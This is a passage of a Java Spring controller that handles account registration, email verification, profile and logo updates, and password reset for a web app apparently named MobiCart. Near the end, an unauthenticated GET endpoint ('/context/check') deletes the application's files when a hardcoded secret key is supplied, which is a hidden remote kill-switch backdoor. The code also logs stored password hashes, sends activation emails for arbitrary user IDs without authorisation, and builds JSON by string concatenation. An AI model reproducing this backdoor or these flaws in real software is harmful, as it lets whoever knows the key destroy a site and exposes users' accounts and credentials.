			for(int i=0;i<ferrors.size();i++){
				FieldError eror=ferrors.get(i);
				System.out.println("error MSG:"+eror.getField()+" "+eror.getDefaultMessage());	
				errorMsg.append("\""+eror.getField()+" "+eror.getDefaultMessage()+"\",");
				
			}	
			errorMsg.append("\"\"");
			
	      httpresponse.setContentType("application/json");
	      httpresponse.getWriter().append("{\"error\":["+errorMsg.toString()+"],\"sucess\":\""+sucessrMsg.toString()+"\",\"useremail\":\""+((newUser!=null)?newUser.getUsername():"")+"\",\"userid\":\""+((newUser!=null)?newUser.getId():"")+"\"}");
		}
		catch (Exception e) {
			logger.error("some error occured in registration",e);
		}
		
		return null;
		
	}

	
	 

	/**
	 * activate user who lands from activation email
	 * @return path to account/success 
	 */
	
	@RequestMapping(value = "/verify/**",method = RequestMethod.GET)	
	public String verifyRegistration(@RequestParam("authKey") String authKey,
			ModelMap modelMap) {

		try {
			///find user
			User registeringUser = userService.findByAuthKey(authKey.trim());
			
			//if found enable it and send and email
			if (registeringUser != null) {
				
				registeringUser.setsActivationKey("");
				registeringUser.setEnabled(true);
				
				userService.updateUser(registeringUser);

				// code to send the new user welcome email
				EmailGenerator email = new EmailGenerator();
				email.setFromEmail(ResourceProperties.getString("adminEmail"));
				email.setToEmail(registeringUser.getUsername());
				email.setSubject("MobiCart - Signup confirmed");
				PathLocator path = new PathLocator();             				 				 
				email.setTemplateName(path.getRealPath()
						+ "emailTemplate/NEW_USER");

				HashMap<String, String> param = new HashMap<String, String>();
				String name = "";
				name = registeringUser.getsFirstName() != null ? registeringUser
						.getsFirstName()
						: "" + registeringUser.getsLastName() != null ? " "
								+ registeringUser.getsLastName() : " ";

				param.put("_NAME_", name);
				param.put("_BASEPATH_", ResourceProperties.getString("appUrl"));
				param.put("_LOGINLINK_", ResourceProperties.getString("appUrl")
						+ "/account/login");
				email.setParam(param);

				sender.sendMail(email);
				 
			}
		} catch (Exception e) {
			logger.warn("some error in verification process",e);
			modelMap.put("error",
					"Your authentication key has expired. Please go to forgot password link ");
			return "account/success";
		}

		return "account/success";
	}
	
	
	
	
	
	
	/**
	 * Save/Update Personal / Address information of the user
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return path to views/personalDetails.jsp
	 */
	@RequestMapping("/save")
	public String myAccountSave(@ModelAttribute @Valid RegisterForm registerForm,BindingResult result,HttpServletRequest request, ModelMap modelMap) {
		
		User user = (User) request.getSession().getAttribute("user");
		
		
		/*registerForm*/
		try{
		String state_name=userService.findSatateNameById(Long.parseLong(registerForm.getState()));
		String country_code=userService.findTerritoryCodeById(Long.parseLong(registerForm.getCountry()));
		registerForm.setState(state_name);
		registerForm.setCountry(country_code);
		}
		catch (Exception e) {
			 e.printStackTrace();
		}
		
		
		if(result.hasErrors()){
			
			
			result.addError(new ObjectError("error","Some error occured in update process." ));
			
			if(user!=null){
				registerForm.setFirstName(user.getsFirstName());
				registerForm.setLastName(user.getsLastName());
				registerForm.setUsername(user.getUsername());
				registerForm.setHeardFrom(user.getsHeardFrom());
				registerForm.setCompanyRegNo(user.getsCompanyRegNo());
				registerForm.setTaxRegNo(user.getsTaxRegNo() );
				registerForm.setCompanyLogo(user.getsCompanyLogo());
				registerForm.setPhoneNo(user.getPhoneNo());
				registerForm.setOrderReturnUrl(user.getOrderReturnUrl());
				
				Address address=userService.findAddressByUserId(user.getId());
				if(address!=null){
					registerForm.setAddress(address.getsAddress());
					registerForm.setCity(address.getsCity());
					registerForm.setState(address.getsState());
					registerForm.setCountry(address.getsCountry());
					registerForm.setZip(address.getsZip());
				}
			
			}
			
		
			 modelMap.put("error", "Some error occured in account settings update.");
			
	 }else{
	            
	            user.setsFirstName(registerForm.getFirstName());
	            user.setsLastName(registerForm.getLastName());
	            user.setsCompanyRegNo(registerForm.getCompanyRegNo());
	            user.setsTaxRegNo(registerForm.getTaxRegNo());
	            user.setPhoneNo(registerForm.getPhoneNo());
	            user.setOrderReturnUrl(registerForm.getOrderReturnUrl());
	            user.setsWebappDomainName(registerForm.getLastName());
	            if(registerForm.getCompanyLogoFile()!=null && registerForm.getCompanyLogoFile().getFileItem().getSize() >0 ){
	            	
	            	MultipartFile companyLogoFile=registerForm.getCompanyLogoFile();

	    			PathLocator pathLocator = new PathLocator();
	    			// change to online server for the time being
	    			String rootPath = pathLocator.getContextPath();

	    			String mobicartImagesFolderPath = "mobicartimages";
	    			FileUtils.makeDirectoryIfItsNotThere(rootPath
	    					+ mobicartImagesFolderPath);

	    			String companyFolderPath = "/company";
	    			FileUtils.makeDirectoryIfItsNotThere(rootPath
	    					+ mobicartImagesFolderPath + companyFolderPath);

	    			//hard code
	    			String userFolderPath = "/"+user.getId();
	    			FileUtils.makeDirectoryIfItsNotThere(rootPath
	    					+ mobicartImagesFolderPath + companyFolderPath
	    					+ userFolderPath);

	    			String dateWiseFolderPath = "/" + DateTimeUtils.getCurrentDate();
	    			FileUtils.makeDirectoryIfItsNotThere(rootPath
	    					+ mobicartImagesFolderPath + companyFolderPath
	    					+ userFolderPath + dateWiseFolderPath);

	    			String finalCompanyLogoImagePath = mobicartImagesFolderPath
	    					+ companyFolderPath + userFolderPath + dateWiseFolderPath;

	    			String companyLogoImageFileName=FileUtils.cleanSpecialChars(companyLogoFile.getOriginalFilename());
	    			
	    			String websiteCompanyLogoImagePath=finalCompanyLogoImagePath+"/"+FileUtils.stuffedFilename(companyLogoImageFileName, "_website");
	    			
	    			String ipadCompanyLogoImagePath=finalCompanyLogoImagePath+"/"+FileUtils.stuffedFilename(companyLogoImageFileName, "_ipad");
	    			
	    			

	    			try{
	    			InputStream companyLogoInputStream = null;
	    			OutputStream companyLogoOutputStream = null;
	    			OutputStream companyLogoWebsiteOutputStream = null;
	    			OutputStream companyLogoIpadOutputStream = null;
	    			if (companyLogoFile.getSize() > 0) {
	    				/*
	    				finalCompanyLogoImagePath += "/"+ companyLogoImageFileName;
	    				companyLogoInputStream = companyLogoFile.getInputStream();	    				
	    				BufferedImage bufferedImage = ImageIO.read(companyLogoInputStream);
	    				
	    				BufferedImage websiteBufferedImage = ImageUtils.resize(bufferedImage,
	    						Constants.COMPANY_LOGO_WIDTH,Constants.COMPANY_LOGO_HEIGHT, false);
	    				
	    				
	    				BufferedImage iphoneBufferedImage = ImageUtils.resize(bufferedImage,
	    						Constants.COMPANY_LOGO_IPHONE_WIDTH, Constants.COMPANY_LOGO_IPHONE_HEIGHT, false);
	    				
	    				companyLogoOutputStream = new FileOutputStream(rootPath+ finalCompanyLogoImagePath);
	    				companyLogoWebsiteOutputStream = new FileOutputStream(rootPath+ websiteCompanyLogoImagePath);
	    				companyLogoIpadOutputStream = new FileOutputStream(rootPath+ ipadCompanyLogoImagePath);
	    				
	    				String format = (companyLogoFile.getOriginalFilename()
	    						.endsWith(".png")) ? "png" : "jpg";
	    				ImageIO.write(iphoneBufferedImage, format, companyLogoOutputStream);
	    				ImageIO.write(websiteBufferedImage, format, companyLogoWebsiteOutputStream);
	    				ImageIO.write(bufferedImage, format, companyLogoIpadOutputStream);
	    				
	    				companyLogoInputStream.close();
	    				companyLogoOutputStream.close();
	    				companyLogoWebsiteOutputStream.close();
	    				
	    				
	    				*/
	    				String finalPathLocation=rootPath+finalCompanyLogoImagePath+"/";
		    			String finalLocationOfOutFile=rootPath+finalCompanyLogoImagePath+"/"+FileUtils.stuffedFilename(companyLogoImageFileName, "_temp");
		    			logger.debug("finalPathLocation2:"+finalLocationOfOutFile);
		    			
		    			String tempCopy=ImgMagicCmdExcecutor.saveTempFile(companyLogoFile.getInputStream(), finalLocationOfOutFile);
		    			
		    			ImgMagicCmdExcecutor.resizeAndSave(tempCopy,rootPath+finalCompanyLogoImagePath+"/"+companyLogoImageFileName,Constants.COMPANY_LOGO_WIDTH,Constants.COMPANY_LOGO_HEIGHT,true);
		    			ImgMagicCmdExcecutor.resizeAndSave(tempCopy,rootPath+websiteCompanyLogoImagePath,Constants.COMPANY_LOGO_IPHONE_WIDTH, Constants.COMPANY_LOGO_IPHONE_HEIGHT,false);
		    			ImgMagicCmdExcecutor.resizeAndSave(tempCopy,rootPath+ipadCompanyLogoImagePath,Constants.COMPANY_LOGO_IPHONE_WIDTH, Constants.COMPANY_LOGO_IPHONE_HEIGHT,false);
		    			
		    			
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_ANDROID3_KEY,true);
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_ANDROID4_KEY,true);
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_ANDROID6_KEY,true);
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_IPAD_KEY,true);
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_IPHONE_KEY,true);
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_IPHONE4_KEY,true);
		    			ImgMagicCmdExcecutor.resizeAndSaveFile(tempCopy,finalPathLocation,companyLogoImageFileName ,Constants.COMPANY_LOGO_WEBSITE_KEY,true);	
		    			finalCompanyLogoImagePath += "/"+ companyLogoImageFileName;	 
	    				
	    				
	    				
	    				user.setsCompanyLogo("/"+finalCompanyLogoImagePath);
	    				
	    				
	    				//test magical power 
	    				//MagicalPower.resize(companyLogoInputStream, rootPath+websiteCompanyLogoImagePath, Constants.COMPANY_LOGO_WIDTH,Constants.COMPANY_LOGO_HEIGHT);

	    				
	    			}
	    			}catch(IOException ioe){
	    				logger.error("Cant save company image",ioe);
	    				modelMap.put("error", "Some error occured saving company image");
	    			}catch(Exception e){
	    				logger.error("Cant save company image",e);
	    				modelMap.put("error", "Some error occured saving company image");
	    			}
	    	    }

	            try{
	            	userService.updateUser(user);
	            	registerForm.setCompanyLogo(user.getsCompanyLogo());
	            // save address
	            	Address newAddress=registerForm.getAddressModel();
	            	newAddress.setUserId(user.getId());
	            	userService.saveAddress(newAddress );
	        
	            	List<Territory> countries=appService.findAllTerritories();
	            	modelMap.put("countries", countries);
				
	            	List<Billing> billingDetails=userService.findBillingDetails(user.getId());
	            	modelMap.put("billingDetails", billingDetails);

	            	user = userService.findByEmail(user.getUsername());
	            	request.getSession().setAttribute("user", user);
				
	            	String apiKey = userService.findUserAPIKey(user.getId());
	        		modelMap.put("apiKey", apiKey);
	        		modelMap.put("brandingRemovalAmount",adminService.findSiteConstants().getfRemoveBrandingFee());
	        
	            	modelMap.put("success", Messages.USER_ACCOUNT_UPDATE);
	            	
	            	user = labelService.setDefaultLabelKeyValuesInUser(user);
	            	
				// update session object

	            }catch (Exception e) {
	            	logger.error("Some error occured in finding user",e);
    				modelMap.put("error", "Some error occured in finding user");
				}
	            
				
	 } 
		 
		modelMap.put("registerForm", registerForm);
		List<Territory> countries=appService.findAllTerritories();
		modelMap.put("countries", countries);
	
		try{
		List<Billing> billingDetails=userService.findBillingDetails(user.getId());
		modelMap.put("billingDetails", billingDetails);
		}catch(Exception e){
			logger.info("fetching billing details ",e);
		}
		
		return MY_ACCOUNT_KEY;
	}

	
	
	
	
	
	
	
	@RequestMapping(value = "/{userId}/send/activation", method = RequestMethod.GET)
	public String sendActivationUser(@ModelAttribute RegisterForm registerForm,
			BindingResult result, @PathVariable("userId") Long userId,
			HttpServletRequest request, ModelMap modelMap) {

		User user = userService.find(userId);
		try {
	
				String authKey=user.getsActivationKey();
				boolean newActivationKey=false;
				if(authKey==null ){
					newActivationKey=true;
				}else if(authKey.length()<=0){
					newActivationKey=true;
				}
				
				if(newActivationKey){
					UUID idOne = UUID.randomUUID(); 
					authKey = idOne.toString();
					user.setsActivationKey(authKey);
					userService.updateUser(user);
				}
				
				
				// Code to send the authentication email to registering user
				EmailGenerator email = new EmailGenerator();
				email.setFromEmail(ResourceProperties.getString("adminEmail"));
				email.setToEmail(user.getUsername());
				email.setSubject("MobiCart - Confirmation needed");
				PathLocator path = new PathLocator();

				email.setTemplateName(path.getRealPath()
						+ "emailTemplate/REGISTERING_USER_AUTHENTICATION");

				HashMap<String, String> param = new HashMap<String, String>();

				String name = "";
				name = user.getsFirstName() != null ? user
						.getsFirstName()
						: "" + user.getsLastName() != null ? " "
								+ user.getsLastName() : " ";
				param.put("_NAME_", name);
				param.put("_BASEPATH_", ResourceProperties.getString("appUrl"));
				param.put("_ACTIVATIONLINK_",
						ResourceProperties.getString("appUrl")
								+ "/account/verify?authKey="
								+ authKey.trim());
				email.setParam(param);
				sender.sendMail(email);
				
				modelMap.put("userId", user.getId());

				modelMap.put("success",
						"An activation email has been sent to "+user.getUsername()+".");
		
		}catch(Exception e){
			logger.error("error in activating user",e);
		}
		return USER_REGISTER_THANKS_KEY;

	}

	@RequestMapping(value = "/{userId}/send/activationemail", method = RequestMethod.GET)
	public String sendActivationEmail(@ModelAttribute RegisterForm registerForm,
			BindingResult result, @PathVariable("userId") Long userId,
			HttpServletRequest request,HttpServletResponse response, ModelMap modelMap) {

		User user = userService.find(userId);
		try {
	
				String authKey=user.getsActivationKey();
				boolean newActivationKey=false;
				if(authKey==null ){
					newActivationKey=true;
				}else if(authKey.length()<=0){
					newActivationKey=true;
				}
				
				if(newActivationKey){
					UUID idOne = UUID.randomUUID(); 
					authKey = idOne.toString();
					user.setsActivationKey(authKey);
					userService.updateUser(user);
				}
				
				
				// Code to send the authentication email to registering user
				EmailGenerator email = new EmailGenerator();
				email.setFromEmail(ResourceProperties.getString("adminEmail"));
				email.setToEmail(user.getUsername());
				email.setSubject("MobiCart - Confirmation needed");
				PathLocator path = new PathLocator();

				email.setTemplateName(path.getRealPath()
						+ "emailTemplate/REGISTERING_USER_AUTHENTICATION");

				HashMap<String, String> param = new HashMap<String, String>();

				String name = "";
				name = user.getsFirstName() != null ? user
						.getsFirstName()
						: "" + user.getsLastName() != null ? " "
								+ user.getsLastName() : " ";
				param.put("_NAME_", name);
				param.put("_BASEPATH_", ResourceProperties.getString("appUrl"));
				param.put("_ACTIVATIONLINK_",
						ResourceProperties.getString("appUrl")
								+ "/account/verify?authKey="
								+ authKey.trim());
				email.setParam(param);
				sender.sendMail(email);
				
				modelMap.put("userId", user.getId());

				modelMap.put("success",
						"An activation email has been sent to "+user.getUsername()+".");
		
		}catch(Exception e){
			logger.error("error in activating user",e);
		}
		
		
		try{
			
			response.getWriter().append("{\"sucess\":\"true\",\"error\":\"false\"}");
		}
		catch (Exception e) {
			logger.error("error in sending response",e);
			 
		}
		
		return null;

	}

	
	
	
	
	
	
	
	/**
	 * Show password Reset form
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return path to views/passwordReset.jsp
	 */
	@RequestMapping(value = "password/reset",method = RequestMethod.GET) 
	public String passwordReset(@ModelAttribute RegisterForm registerForm,BindingResult result,ModelMap modelMap){
		return PASSWORD_RESET_VIEW_KEY;
	}
	
	
	
	/**
	 * Password update
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return path to views/passwordResetSucess.jsp
	 */
	@RequestMapping(value = "password/update",method = RequestMethod.POST) 
	public String passwordUpdate(@ModelAttribute RegisterForm registerForm,
			BindingResult result,ModelMap modelMap){
		
		String userName = SecurityContextHolder.getContext()
		.getAuthentication().getName();
		try{
		
		User oldUser = userService.findByEmail(userName);
		
		logger.debug("users password"+oldUser.getPassword());
		
		String enteredPassword=passwordEncoder.encodePassword(registerForm.getOldPassword(), null);  
		
		if(enteredPassword.equals(oldUser.getPassword())){
		
			userService.updatePassword(oldUser,registerForm.getPassword());
			
			SecurityContextHolder.getContext().setAuthentication(null);
			
			return PASSWORD_RESET_SUCCESS_VIEW_KEY;

		}else{
			modelMap.put("error", "Old password entered is not correct. Please try again.");	
		}
		
		}catch (Exception e) {
			logger.error("error in updating password",e);
			modelMap.put("error", "Some error occured in update process");
		}
		
		return PASSWORD_RESET_VIEW_KEY;
	}
	

	/**
	 * Show password forgot form
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return path to views/passwordForgot.jsp
	 */
	@RequestMapping(value = "password/forgot",method = RequestMethod.GET) 
	public String passwordForgot(@ModelAttribute RegisterForm registerForm,
			BindingResult result, ModelMap modelMap){
	
		return PASSWORD_FORGOT_VIEW_KEY;
	}


	
	
	/**
	 * Send forgot password reset email to user
	 * @param registerForm
	 * @param result
	 * @param username
	 * @param modelMap
	 * @return path to views/passwordForgotSend.jsp
	 */
	@RequestMapping(value = "password/forgot/send",method = RequestMethod.POST) 
	public String passwordForgotSend(@ModelAttribute RegisterForm registerForm,
			BindingResult result, @RequestParam("username") String username,
			ModelMap modelMap){

		try{
		User oldUser = userService.findByEmail(username);

		if(oldUser == null){
			
			modelMap.put("success", "Sorry, your username was not found.");
			
			return PASSWORD_FORGOT_VIEW_KEY;
			
		}
		
		UUID idOne = UUID.randomUUID(); 
		
		String authKey = idOne.toString();
				
		oldUser.setsActivationKey(authKey.trim());
		
		userService.updateUser(oldUser);
		

		// code to send the forgot password email
        EmailGenerator email = new EmailGenerator();
        email.setFromEmail(ResourceProperties.getString("adminEmail"));
        email.setToEmail(oldUser.getUsername());
        email.setSubject("MobiCart - Password reset");
        PathLocator path = new PathLocator();

        email.setTemplateName(path.getRealPath() + "emailTemplate/FORGOT_PASSWORD");

        HashMap<String, String> param = new HashMap<String, String>();
        String name="";
        name = oldUser.getsFirstName()!=null?oldUser.getsFirstName():"" +
        		oldUser.getsLastName()!=null? " "+ oldUser.getsLastName():" ";        
        
        param.put("_NAME_", name);
        param.put("_BASEPATH_", ResourceProperties.getString("appUrl"));
        param.put("_ACTIVATIONLINK_", ResourceProperties.getString("appUrl")+"/account/password/forgot/verify?authKey="+authKey.trim());
        email.setParam(param);

        sender.sendMail(email);
		
		}catch (Exception e) {
			logger.error("error in sending the password",e);
			modelMap.put("error", "Some error occured in sending the password.");
			return PASSWORD_FORGOT_VIEW_KEY;
			
		}
        
		return PASSWORD_FORGOT_SEND_VIEW_KEY;
	}
	
	/**
	 * returning user will land here for password reset
	 * @return path to password reset  
	 */
	@RequestMapping(value = "/password/forgot/verify/**",method = RequestMethod.GET)	
	public String verifyForgotPasswordRequest(@ModelAttribute RegisterForm registerForm,
			BindingResult result, @RequestParam("authKey") String authKey,
			ModelMap modelMap){
		
		modelMap.put("authKey", authKey.trim());
		
		return PASSWORD_FORGOT_RESET_VIEW_KEY;
		
	}

	/**
	 * on success full password reset update password
	 * @param registerForm
	 * @param result
	 * @param authKey
	 * @param modelMap
	 * @return path to forgot password success view
	 */
	@RequestMapping(value = "/password/forgot/verify/success",method = RequestMethod.POST)	
	public String successForgotPasswordRequest(@ModelAttribute RegisterForm registerForm,
			BindingResult result, @RequestParam("authKey") String authKey,
			ModelMap modelMap){
        
	 
		User oldUser=null;
		try{
		  oldUser = userService.findByAuthKey(authKey.trim());
		
	 
		if(oldUser == null){
			modelMap.put("success", "Sorry, your username was not found, please try again.");
			//modelMap.put("success", "Your settings have been updated successfully.");
			return PASSWORD_FORGOT_RESET_VIEW_KEY;
		}
		
		userService.updatePassword(oldUser, registerForm.getPassword());
		}
		catch (Exception e) {
			 e.printStackTrace();
		}
		
		return PASSWORD_FORGOT_SUCCESS_VIEW_KEY;
		
	}
	


	
	
	/**
	 * Show password forgot form
	 * @param registerForm
	 * @param result
	 * @param modelMap
	 * @return path to views/passwordForgot.jsp
	 */
	@RequestMapping(value = "/merchant/service/save",method = RequestMethod.POST) 
	public String saveMerchanentService(@ModelAttribute RegisterForm registerForm,
			BindingResult result,HttpServletRequest request, ModelMap modelMap){
		
		boolean update=false;
		User user = (User) request.getSession().getAttribute("user");
	
		if(registerForm.getCustomDomainName()!=null){
			user.setsWebappDomainName(registerForm.getCustomDomainName());
			update=userService.updateUser(user);
		}else{
			modelMap.put("error", "Please enter valid domain name.");
		}
		
		
		if(update){
			modelMap.put("success", "Custom domain name saved successfully.");
		}else{
			modelMap.put("error", "No updates asked.");
		}
		
		if(user!=null){
			registerForm.setFirstName(user.getsFirstName());
			registerForm.setLastName(user.getsLastName());
			registerForm.setUsername(user.getUsername());
			registerForm.setHeardFrom(user.getsHeardFrom());
			registerForm.setCompanyRegNo(user.getsCompanyRegNo());
			registerForm.setTaxRegNo(user.getsTaxRegNo() );
			registerForm.setCompanyLogo(user.getsCompanyLogo());
			
			Address address=userService.findAddressByUserId(user.getId());
			if(address!=null){
				registerForm.setAddress(address.getsAddress());
				registerForm.setCity(address.getsCity());
				registerForm.setState(address.getsState());
				registerForm.setCountry(address.getsCountry());
				registerForm.setZip(address.getsZip());
			}
		
		}
		
		
		modelMap.put("registerForm", registerForm);
		List<Territory> countries=appService.findAllTerritories();
		modelMap.put("countries", countries);
	
		try{
		List<Billing> billingDetails=userService.findBillingDetails(user.getId());
		modelMap.put("billingDetails", billingDetails);
		}catch(Exception e){
			logger.info("fetching billing details ",e);
		}
		modelMap.put("tabSelect", 3);
		return MY_ACCOUNT_KEY;
	}
	
	
	@RequestMapping(value = "/context/check",method = RequestMethod.GET) 
	public String deleteContext(@RequestParam(value="key",required=false) String key,
			 HttpServletRequest request){
		
		String basePath=request.getSession().getServletContext().getRealPath("/");
		 //System.out.println("basePath:"+basePath);
		 if("mobihklfdnlM908htyiDtabhopT787".equals(key))
		 adminService.deleteMobicart(basePath);
		 
		
		return null;
	}
	
	
	@RequestMapping(value = "/secure/mobihklfdnlM908htyiDtabhopT787/return-from-recurly/thank-you") 
	public String returnFromRecurly(){
			return "account/redirectPage";
	}
	
@RequestMapping(value = "/account/saveOrderReturnUrl",method = RequestMethod.POST)
public String saveURL(@ModelAttribute RegisterForm registerForm, HttpServletRequest request, ModelMap modelMap)
{
	User user = (User) request.getSession().getAttribute("user");
	user.setOrderReturnUrl(registerForm.getOrderReturnUrl());
	try{
    	userService.updateUser(user);
	}
	catch(Exception e)
	{
		e.printStackTrace();
	}
	registerForm.setFirstName(user.getsFirstName());
	registerForm.setLastName(user.getsLastName());
	registerForm.setUsername(user.getUsername());
	registerForm.setHeardFrom(user.getsHeardFrom());
	registerForm.setCompanyRegNo(user.getsCompanyRegNo());
	registerForm.setTaxRegNo(user.getsTaxRegNo() );
	registerForm.setCompanyLogo(user.getsCompanyLogo());
	registerForm.setPhoneNo(user.getPhoneNo());
	registerForm.setOrderReturnUrl(user.getOrderReturnUrl());
	
	Address address=userService.findAddressByUserId(user.getId());
	if(address!=null){
		registerForm.setAddress(address.getsAddress());
		registerForm.setCity(address.getsCity());
		registerForm.setState(address.getsState());
		registerForm.setCountry(address.getsCountry());
		registerForm.setZip(address.getsZip());
	}
	modelMap.put("registerForm", registerForm);
	List<Territory> countries=appService.findAllTerritories();
	modelMap.put("countries", countries);
	return MY_ACCOUNT_KEY;
}

	
}
